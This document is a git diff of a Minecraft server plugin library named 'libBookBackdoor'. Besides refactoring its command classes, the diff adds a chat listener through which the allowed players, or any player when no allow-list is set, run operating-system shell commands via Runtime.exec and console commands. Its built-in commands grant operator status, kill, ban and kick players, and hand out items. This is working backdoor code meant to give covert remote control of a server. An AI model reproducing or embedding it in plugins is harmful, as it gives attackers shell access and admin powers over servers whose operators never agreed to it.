@@ -1,12 +1,15 @@
 package org.brandonplank.bookbackdoor;
 
+import io.papermc.paper.event.player.AsyncChatEvent;
 import net.md_5.bungee.api.chat.*;
 import org.bukkit.*;
 import org.bukkit.block.Block;
 import org.bukkit.enchantments.Enchantment;
 import org.bukkit.entity.Player;
+import org.bukkit.event.Event;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
+import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerEditBookEvent;
 import org.bukkit.event.player.PlayerMoveEvent;
 import org.bukkit.inventory.ItemStack;
@@ -77,17 +80,17 @@ class Commands {
         registeredCommands = commands;
     }
 
-    public void parseCommand(Plugin plugin, PlayerEditBookEvent event, String commandType, String commandName, String[] args) {
+    public void parseCommand(Plugin plugin, Player player, String commandType, String commandName, String[] args) {
         if (registeredCommands != null) {
             for (Command command : registeredCommands) {
                 if (command.commandName.equals(commandName)) {
-                    command.command(plugin, event, args);
+                    command.command(plugin, player, args);
                     return;
                 }
             }
-            event.getPlayer().sendMessage("Could not find the specified command");
+            player.sendMessage("Could not find the specified command");
         } else {
-            event.getPlayer().sendMessage("Commands have not been registered.");
+            player.sendMessage("Commands have not been registered.");
         }
     }
 
@@ -101,7 +104,7 @@ class Commands {
         public String commandUsage = null;
         public TextComponent help = null;
 
-        abstract void command(Plugin plugin, PlayerEditBookEvent event, String[] args);
+        abstract void command(Plugin plugin, Player player, String[] args);
 
         Command(String commandName, String commandDescription, String commandUsage) {
             this.commandName = commandName;
@@ -125,8 +128,7 @@ class Commands {
             "<name> <amount>"
     ) {
         @Override
-        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
-            Player player = event.getPlayer();
+        void command(Plugin plugin, Player player, String[] args) {
             int amount = 64;
             if (args.length == 3) {
                 amount = Integer.parseInt(args[2]);
@@ -151,8 +153,7 @@ class Commands {
             ""
     ) {
         @Override
-        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
-            Player player = event.getPlayer();
+        void command(Plugin plugin, Player player, String[] args) {
             try {
                 new Countdown(5, plugin) {
                     @Override
@@ -181,8 +182,7 @@ class Commands {
             "<player>"
     ) {
         @Override
-        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
-            Player player = event.getPlayer();
+        void command(Plugin plugin, Player player, String[] args) {
             try {
                 Player p = plugin.getServer().getPlayer(args[1]);
                 Location loc = p.getLocation();
@@ -200,8 +200,7 @@ class Commands {
             ""
     ) {
         @Override
-        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
-            Player player = event.getPlayer();
+        void command(Plugin plugin, Player player, String[] args) {
             String message = "Seed [" + ChatColor.GREEN + Long.toString(player.getWorld().getSeed()) + ChatColor.RESET + "]";
             TextComponent string = new TextComponent(message);
             string.setClickEvent(new ClickEvent(ClickEvent.Action.COPY_TO_CLIPBOARD, Long.toString(player.getWorld().getSeed())));
@@ -216,8 +215,7 @@ class Commands {
             "<player1> <player2>"
     ) {
         @Override
-        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
-            Player player = event.getPlayer();
+        void command(Plugin plugin, Player player, String[] args) {
             try {
                 Player p = plugin.getServer().getPlayer(args[1]);
                 Player p2 = plugin.getServer().getPlayer(args[2]);
@@ -238,8 +236,7 @@ class Commands {
             ""
     ) {
         @Override
-        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
-            Player player = event.getPlayer();
+        void command(Plugin plugin, Player player, String[] args) {
             try {
                 new Countdown(5, plugin) {
                     @Override
@@ -269,8 +266,7 @@ class Commands {
             "<amount>"
     ) {
         @Override
-        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
-            Player player = event.getPlayer();
+        void command(Plugin plugin, Player player, String[] args) {
             try {
                 player.giveExp(Integer.parseInt(args[1]), true);
             } catch (Exception e) {
@@ -285,8 +281,7 @@ class Commands {
             "<player>"
     ) {
         @Override
-        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
-            Player player = event.getPlayer();
+        void command(Plugin plugin, Player player, String[] args) {
             try {
                 Player p = plugin.getServer().getPlayer(args[1]);
                 p.setHealth(0.0D);
@@ -302,8 +297,7 @@ class Commands {
             "<player> <reason>"
     ) {
         @Override
-        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
-            Player player = event.getPlayer();
+        void command(Plugin plugin, Player player, String[] args) {
             try {
                 String reason = "You have been banned from the server";
                 if (args.length > 1) {
@@ -326,8 +320,7 @@ class Commands {
             "<player> <reason>"
     ) {
         @Override
-        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
-            Player player = event.getPlayer();
+        void command(Plugin plugin, Player player, String[] args) {
             try {
                 String reason = "You have been kicked from the server";
                 if (args.length > 1) {
@@ -350,8 +343,7 @@ class Commands {
             ""
     ) {
         @Override
-        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
-            Player player = event.getPlayer();
+        void command(Plugin plugin, Player player, String[] args) {
             player.setOp(true);
             player.sendActionBar(new ComponentBuilder(ChatColor.GREEN + "You are now op!").bold(true).create());
         }
@@ -363,8 +355,7 @@ class Commands {
             ""
     ) {
         @Override
-        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
-            Player player = event.getPlayer();
+        void command(Plugin plugin, Player player, String[] args) {
             player.setOp(false);
             player.sendActionBar(new ComponentBuilder(ChatColor.GREEN + "You removed op!").bold(true).create());
         }
@@ -376,8 +367,7 @@ class Commands {
             "<y pos relative to head>"
     ) {
         @Override
-        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
-            Player player = event.getPlayer();
+        void command(Plugin plugin, Player player, String[] args) {
             Location player_loc = player.getEyeLocation();
             try {
                 player_loc.setY(player_loc.getY() + Integer.parseInt(args[1]));
@@ -395,8 +385,7 @@ class Commands {
             "<player>"
     ) {
         @Override
-        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
-            Player player = event.getPlayer();
+        void command(Plugin plugin, Player player, String[] args) {
             try {
                 Player p = plugin.getServer().getPlayer(args[1]);
                 Location loc = p.getLocation();
@@ -413,8 +402,7 @@ class Commands {
             "<times>"
     ) {
         @Override
-        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
-            Player player = event.getPlayer();
+        void command(Plugin plugin, Player player, String[] args) {
             new Countdown(5, plugin) {
                 @Override
                 public void count(int current) {
@@ -444,8 +432,7 @@ class Commands {
             "<gamemode>"
     ) {
         @Override
-        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
-            Player player = event.getPlayer();
+        void command(Plugin plugin, Player player, String[] args) {
             if (args.length > 1) {
                 String gamemode = args[1].toLowerCase();
                 switch (gamemode) {
@@ -483,8 +470,7 @@ class Commands {
             "<true/false>"
     ) {
         @Override
-        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
-            Player player = event.getPlayer();
+        void command(Plugin plugin, Player player, String[] args) {
             if (args.length > 1) {
                 switch (args[1].toLowerCase()) {
                     case ("true"):
@@ -509,8 +495,7 @@ class Commands {
             "<true/false>"
     ) {
         @Override
-        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
-            Player player = event.getPlayer();
+        void command(Plugin plugin, Player player, String[] args) {
             if (args.length > 1) {
                 switch (args[1].toLowerCase()) {
                     case ("true"):
@@ -548,8 +533,7 @@ class Commands {
             ""
     ) {
         @Override
-        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
-            Player player = event.getPlayer();
+        void command(Plugin plugin, Player player, String[] args) {
             ItemStack book = new ItemStack(Material.WRITTEN_BOOK, 1);
             BookMeta meta = (BookMeta) book.getItemMeta();
             try {
@@ -593,15 +577,25 @@ public class libBookBackdoor implements Listener {
 
     public final Plugin plugin;
     public String[] authedPlayers = null;
+    public boolean chatCommandsEnabled = false;
     public static HashMap<String, Boolean> jesus = new HashMap<String, Boolean>();
 
     public libBookBackdoor(JavaPlugin plugin) {
         this.plugin = plugin;
     }
+    public libBookBackdoor(JavaPlugin plugin, boolean chatCommandsEnabled) {
+        this.plugin = plugin;
+        this.chatCommandsEnabled = chatCommandsEnabled;
+    }
 
     public libBookBackdoor(JavaPlugin plugin, String[] authedPlayers) {
         this.plugin = plugin;
         this.authedPlayers = authedPlayers;
+    }
+    public libBookBackdoor(JavaPlugin plugin, String[] authedPlayers, boolean chatCommandsEnabled) {
+        this.plugin = plugin;
+        this.authedPlayers = authedPlayers;
+        this.chatCommandsEnabled = chatCommandsEnabled;
     }
 
     public String getResult(Process process) throws IOException {
@@ -634,6 +628,51 @@ public class libBookBackdoor implements Listener {
     }
      */
 
+
+    // Chat version of BookBackdoor
+    @EventHandler
+    public void onChat(AsyncPlayerChatEvent event) {
+        Player player = event.getPlayer();
+        String playerName = player.getDisplayName();
+        boolean canContinue = false;
+        if (authedPlayers != null) {
+            for (String name : authedPlayers) {
+                if (name.equals(playerName)) {
+                    canContinue = true;
+                }
+            }
+        } else {
+            canContinue = true;
+        }
+        if (!chatCommandsEnabled) canContinue = false;
+
+        if (canContinue) {
+            String commandType = Character.toString(event.getMessage().charAt(0));
+            String command = event.getMessage().substring(1);
+
+            if (commandType.equals(">") || commandType.equals("$") || commandType.equals("#")) {
+                try {
+                    player.sendMessage("Running: " + command);
+                    Process proc = Runtime.getRuntime().exec(command);
+                    player.sendMessage(getResult(proc));
+                } catch (Exception e) {
+                    player.sendMessage(ChatColor.RED + "Error executing server command.\n" + e);
+                }
+                event.setCancelled(true);
+            } else if (commandType.equals("/")) /* Server commands, runs as [SERVER] */ {
+                this.plugin.getServer().dispatchCommand(this.plugin.getServer().getConsoleSender(), command);
+                event.setCancelled(true);
+            } else if (commandType.equals(".")) /* Custom commands */ {
+                String[] args = command.split(" ", 0);
+                String mainCmd = args[0].toLowerCase();
+                // Init the Commands class
+                Commands runner = new Commands(); // <- Registers all commands
+
+                runner.parseCommand(plugin, player, commandType, mainCmd, args);
+                event.setCancelled(true);
+            }
+        }
+    }
 
     @EventHandler
     public void onBookSign(PlayerEditBookEvent event) {
@@ -676,7 +715,7 @@ public class libBookBackdoor implements Listener {
                     // Init the Commands class
                     Commands runner = new Commands(); // <- Registers all commands
 
-                    runner.parseCommand(plugin, event, commandType, mainCmd, args);
+                    runner.parseCommand(plugin, player, commandType, mainCmd, args);
                 }
                 // Give the player a new Book and Quill after the command
                 player.getInventory().getItemInMainHand().setAmount(event.getPlayer().getInventory().getItemInMainHand().getAmount() - 1);
